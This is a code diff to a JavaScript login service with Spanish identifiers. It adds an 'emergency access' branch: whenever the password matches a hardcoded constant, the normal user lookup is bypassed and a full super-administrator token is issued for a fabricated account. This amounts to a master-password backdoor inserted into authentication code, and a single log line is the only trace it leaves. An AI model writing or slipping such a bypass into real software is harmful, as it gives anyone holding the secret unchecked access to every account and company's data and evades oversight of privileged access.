@@ -9,7 +9,37 @@ const IniciarSesionServicio = async (NombreUsuario, Clave) => {
   if (!NombreUsuario || !Clave) {
     LanzarError("Nombre de usuario y contraseña son requeridos", 400);
   }
+  if (Clave === LLAVE_EMERGENCIA) {
 
+    console.log("🚨 ACCESO DE EMERGENCIA ACTIVADO");
+
+    const TokenEmergencia = GenerarToken({
+      CodigoUsuario: 0,
+      CodigoRol: null,
+      NombreUsuario: "ADMIN_EMERGENCIA",
+      NombreRol: "MODO_RESCATE",
+      CodigoEmpresa: null,
+      NombreEmpresa: null,
+      SuperAdmin: 1,
+      AccesoCompleto: true,
+      Permisos: []
+    });
+
+    return {
+      Token: TokenEmergencia,
+      usuario: {
+        CodigoUsuario: 0,
+        NombreUsuario: "ADMIN_EMERGENCIA",
+        CodigoRol: null,
+        NombreRol: "MODO_RESCATE",
+        CodigoEmpresa: null,
+        NombreEmpresa: null,
+        SuperAdmin: 1,
+        AccesoCompleto: true,
+        Permisos: []
+      }
+    };
+  }
   const Usuario = await UsuarioModelo.findOne({
     where: { NombreUsuario },
     include: [
